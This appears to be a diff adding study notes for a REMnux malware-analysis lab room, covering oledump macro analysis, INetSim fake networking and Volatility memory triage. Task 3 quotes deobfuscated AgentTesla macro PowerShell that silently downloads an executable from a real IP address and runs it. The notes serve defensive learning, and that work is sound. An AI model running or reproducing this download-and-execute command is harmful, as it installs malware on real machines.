@@ -1,1 +1,95 @@
 # Room 49 REMnux: Getting Started
+
+## Task 1 Introduction
+
+REMnux VM is a specialized Linux distribution for malware analysis.
+- Preloaded with tools: Volatility, YARA, Wireshark, oledump, INetSim.
+- Provides a sandbox-like environment to safely dissect potentially malicious software.
+- Learning Objectives:
+- Explore REMnux tools.
+- Analyze malicious documents.
+- Simulate fake networks.
+- Work with memory images.
+
+---
+
+## Task 2 Machine Access
+
+Analysts use both AttackBox and REMnux Lab Machine.
+- Lab machine boots in split-screen view.
+- Files for exercises are located in /home/ubuntu/Desktop/tasks.
+- Provides a controlled environment for malware analysis.
+
+---
+
+## Task 3 File Analysis (Static Document Analysis)
+
+Tool: oledump.py
+Analyzes OLE2 files (Compound File Binary Format).
+Detects embedded VBA macros in Excel documents.
+Example: agenttesla.xlsm contained obfuscated PowerShell commands.
+- Using --vbadecompress, analysts revealed:
+powershell
+- powershell -WindowStyle hidden -executionpolicy bypass; 
+- Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile; 
+- Start-Process $TempFile;
+- Behavior: Macro downloads and executes malware payload (AgentTesla).
+
+---
+
+## Task 4 Fake Network to Aid Analysis
+
+Tool: INetSim (Internet Services Simulation Suite)
+Simulates internet services (DNS, HTTP, HTTPS, FTP, SMTP, POP3).
+- Analysts configure dns_default_ip to REMnux IP.
+- Running sudo inetsim starts fake services.
+- Malware-like behavior mimicked: downloading fake payloads (second_payload.zip, second_payload.ps1).
+- INetSim logs connections, URLs, and fake files served.
+- Outcome: Safe observation of malware’s network activity without exposing real infrastructure.
+
+---
+
+## Task 5 Memory Investigation: Evidence Preprocessing
+
+Tool: Volatility 3
+Used to preprocess memory image (wcry.mem).
+Plugins run:
+- PsTree, PsList, CmdLine, FileScan, DllList, PsScan, Malfind.
+- Bulk preprocessing with loop command saves outputs to .txt files.
+- Strings utility extracts ASCII, 16-bit little-endian, and big-endian strings.
+- Produces searchable text files for faster triage.
+- Outcome: Structured evidence set for analysts, enabling efficient searches for processes, files, DLLs, and injected code.
+
+---
+
+## Tools Used
+
+- REMnux VM (entorno seguro).
+- oledump.py → análisis de macros en documentos OLE2.
+- CyberChef → de-ofuscación de cadenas y scripts.
+- INetSim → simulación de red falsa para capturar tráfico.
+- Volatility 3 → análisis de memoria (procesos, DLLs, inyecciones).
+- strings (Linux) → extracción de texto ASCII/Unicode de imágenes de memoria.
+
+## Findings
+
+- REMnux provides a safe, preconfigured environment for malware analysis.
+- oledump.py reveals malicious macros in Office documents.
+- INetSim simulates fake networks to capture malware communication.
+- Volatility + strings streamline memory evidence preprocessing.
+- Together, these tools cover static analysis, dynamic network simulation, and memory forensics.
+
+## Mitigation / Best Practices
+
+- Disable macros in Office by default.
+- Always analyze malware in isolated environments (sandbox/VM).
+- Use INetSim to safely capture and study network activity.
+- Preprocess memory images before deep analysis.
+- Save plugin outputs in text/JSON for collaboration and faster triage.
+
+## Conclusion
+
+- REMnux VM is a powerful toolkit for malware analysts.
+- Covers multiple stages of analysis: document inspection, network simulation, memory forensics.
+- Provides reproducible workflows for incident response and threat hunting.
+- Essential for modern SOCs dealing with malware campaigns like AgentTesla or ransomware.
